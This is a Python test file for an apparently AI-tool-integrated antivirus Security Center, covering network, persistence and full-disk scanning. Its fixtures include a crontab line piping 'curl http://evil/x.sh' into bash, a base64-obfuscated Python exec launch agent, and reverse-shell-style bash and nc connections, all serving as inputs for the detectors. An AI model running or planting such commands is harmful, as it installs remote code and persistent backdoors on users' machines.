"""Tests for Ember's unified always-on Security Center (security_center.py).

Runnable two ways:
    pytest test_security_center.py
    python test_security_center.py        # PASS/FAIL summary

Network + persistence enumerators are injected (security_center._NET_ENUM /
_PERSIST_ENUM) so nothing real is read; all antivirus state is redirected to a
throwaway dir. Hermetic and offline.
"""
import json
import os
import tempfile
import time
from pathlib import Path

_TMP = tempfile.mkdtemp(prefix="ember_sc_test_")
os.environ["EMBER_SUPPORT_DIR"] = _TMP
os.environ.pop("VIRUSTOTAL_API_KEY", None)
os.environ.pop("VT_API_KEY", None)

import antivirus
import security_center as sc

antivirus.set_config(vt_api_key="", vt_hash_lookup=False, vt_upload_unknown=False)


def _reset():
    sc.security_center_stop()
    with sc._LOCK:
        sc._events.clear()
        for k in sc._counts:
            sc._counts[k] = 0
        sc._threats = 0
        sc._scan_cycles = 0
        sc._net_seen.clear()
        sc._persist_seen.clear()
        sc._persist_baseline.clear()
        sc._persist_baseline_ready = False
        sc._file_seen.clear()
    sc._NET_ENUM = None
    sc._PERSIST_ENUM = None


# --- network scanning ----------------------------------------------------------

def test_scan_network_flags_backdoor_and_shell():
    _reset()
    sc._NET_ENUM = lambda: [
        {"pid": 10, "name": "bash", "laddr": "10.0.0.2:5000", "raddr": "5.6.7.8:4444",
         "lport": 5000, "rport": 4444, "status": "ESTABLISHED"},
        {"pid": 11, "name": "nc", "laddr": "0.0.0.0:31337", "raddr": "",
         "lport": 31337, "rport": None, "status": "LISTEN"},
        {"pid": 12, "name": "Spotify", "laddr": "10.0.0.2:5500", "raddr": "1.2.3.4:443",
         "lport": 5500, "rport": 443, "status": "ESTABLISHED"},
    ]
    r = sc.scan_network()
    assert r["ok"] and r["scanned"] == 3, r
    assert r["flagged_count"] == 2, r
    sevs = [f["severity"] for f in r["flagged"]]
    assert all(s == "suspicious" for s in sevs), r
    _reset()


def test_scan_network_known_bad_ip_is_malicious():
    _reset()
    sig = Path(_TMP) / "signatures.json"
    sig.write_text(json.dumps({"bad_ips": ["66.66.66.66"]}), "utf-8")
    antivirus._SIG_CACHE = None
    sc._NET_ENUM = lambda: [
        {"pid": 9, "name": "evil", "laddr": "10.0.0.2:5000", "raddr": "66.66.66.66:443",
         "lport": 5000, "rport": 443, "status": "ESTABLISHED"},
    ]
    try:
        r = sc.scan_network()
        assert r["flagged_count"] == 1 and r["flagged"][0]["severity"] == "malicious", r
    finally:
        sig.unlink(missing_ok=True)
        antivirus._SIG_CACHE = None
        _reset()


def test_scan_network_handles_failure():
    _reset()
    sc._NET_ENUM = lambda: None
    r = sc.scan_network()
    assert r["ok"] is False and "error" in r, r
    _reset()


# --- persistence scanning ------------------------------------------------------

def test_scan_persistence_flags_malicious_autostart():
    _reset()
    sc._PERSIST_ENUM = lambda: [
        {"location": "user-crontab", "name": "job",
         "command": "* * * * * curl http://evil/x.sh | bash"},
        {"location": "shell-rc:.bashrc", "name": ".bashrc",
         "command": "export PATH=$PATH:/usr/local/bin\nalias ll='ls -la'"},
        {"location": "launchd:LaunchAgents", "name": "com.x.plist",
         "command": "/usr/bin/python3 -c exec(__import__('base64').b64decode('...'))"},
    ]
    r = sc.scan_persistence()
    assert r["ok"] and r["scanned"] == 3, r
    assert r["flagged_count"] == 2, r          # crontab + obfuscated python; bashrc clean
    assert any(f["severity"] == "malicious" for f in r["flagged"]), r
    _reset()


def test_scan_persistence_handles_failure():
    _reset()
    sc._PERSIST_ENUM = lambda: None
    r = sc.scan_persistence()
    assert r["ok"] is False, r
    _reset()


# --- full scan -----------------------------------------------------------------

def test_run_full_scan_finds_and_quarantines_eicar():
    _reset()
    scan_dir = Path(_TMP) / "fullscan"
    scan_dir.mkdir(exist_ok=True)
    (scan_dir / "clean.txt").write_text("nothing to see here\n")
    (scan_dir / "evil.com").write_bytes(antivirus.EICAR_SIG)
    r = sc.run_full_scan(paths=[str(scan_dir)])
    assert r["ok"] and r["scanned"] >= 2, r
    assert r["flagged_count"] >= 1, r
    assert not (scan_dir / "evil.com").exists()    # EICAR quarantined
    _reset()


# --- supervisor + aggregation + dedup ------------------------------------------

def test_supervisor_aggregates_and_dedupes():
    _reset()
    # Keep the watchdog inert + skip disk sweep so the test stays hermetic.
    antivirus.set_config(scan_downloads=False, fileless_protection=False,
                         sc_file_sweep=False, sc_network_interval=0.05,
                         sc_persistence_interval=0.05)
    sc._NET_ENUM = lambda: [
        {"pid": 10, "name": "bash", "laddr": "10.0.0.2:5000", "raddr": "5.6.7.8:4444",
         "lport": 5000, "rport": 4444, "status": "ESTABLISHED"}]
    sc._PERSIST_ENUM = lambda: [
        {"location": "user-crontab", "name": "job",
         "command": "* * * * * curl http://evil/x.sh | bash"}]
    sc._SUPERVISE_TICK = 0.05   # wake often so several cycles run quickly
    try:
        s = sc.security_center_start()
        assert s["ok"] and s["running"], s
        deadline = time.time() + 3.0
        while time.time() < deadline and sc.security_center_status()["scan_cycles"] < 4:
            time.sleep(0.05)
        st = sc.security_center_status()
        assert st["running"] and st["scan_cycles"] >= 4, st
        # Standing conditions must be reported ONCE, not once per cycle.
        assert st["by_source"]["network"] == 1, st
        assert st["by_source"]["persistence"] == 1, st
        assert st["threats_found"] == 2, st
    finally:
        sc.security_center_stop()
        sc._SUPERVISE_TICK = 2.0
        antivirus.set_config(scan_downloads=True, fileless_protection=True,
                             sc_file_sweep=True, sc_network_interval=20,
                             sc_persistence_interval=45)
        _reset()


def test_start_is_idempotent():
    _reset()
    antivirus.set_config(scan_downloads=False, fileless_protection=False, sc_file_sweep=False)
    sc._NET_ENUM = lambda: []
    sc._PERSIST_ENUM = lambda: []
    try:
        a = sc.security_center_start()
        b = sc.security_center_start()
        assert a["ok"] and b["ok"], (a, b)
        assert "already active" in b.get("message", ""), b
    finally:
        sc.security_center_stop()
        antivirus.set_config(scan_downloads=True, fileless_protection=True, sc_file_sweep=True)
        _reset()


def test_new_persistence_entry_noted_after_baseline():
    _reset()
    state = {"items": [{"location": "user-crontab", "name": "ok", "command": "echo hi"}]}
    sc._PERSIST_ENUM = lambda: state["items"]
    # First cycle establishes the baseline (no "new" notes).
    sc._persistence_cycle()
    assert sc._counts["persistence"] == 0, sc._counts
    # A brand-new (clean) autostart entry appears -> noted as info.
    state["items"] = state["items"] + [
        {"location": "xdg-autostart", "name": "added.desktop", "command": "/usr/bin/legit"}]
    sc._persistence_cycle()
    assert sc._counts["persistence"] == 1, sc._counts
    evs = sc.security_center_events()["events"]
    assert any("new autostart entry" in e["detail"] for e in evs), evs
    _reset()


def test_tool_wiring_exports():
    assert set(sc.TOOL_DISPATCH) == {d["name"] for d in sc.TOOL_DECLARATIONS}
    assert "scan_network" in sc.READONLY_TOOLS
    assert "security_center_start" in sc.INTERACTION_TOOLS
    assert "run_full_scan" in sc.INTERACTION_TOOLS


def _run_all() -> bool:
    import types
    funcs = [v for k, v in sorted(globals().items())
             if k.startswith("test_") and isinstance(v, types.FunctionType)]
    passed = 0
    for fn in funcs:
        try:
            fn()
            print(f"PASS  {fn.__name__}")
            passed += 1
        except Exception as e:
            print(f"FAIL  {fn.__name__}: {e}")
    print(f"\n{passed}/{len(funcs)} passed")
    return passed == len(funcs)


if __name__ == "__main__":
    import sys
    sys.exit(0 if _run_all() else 1)
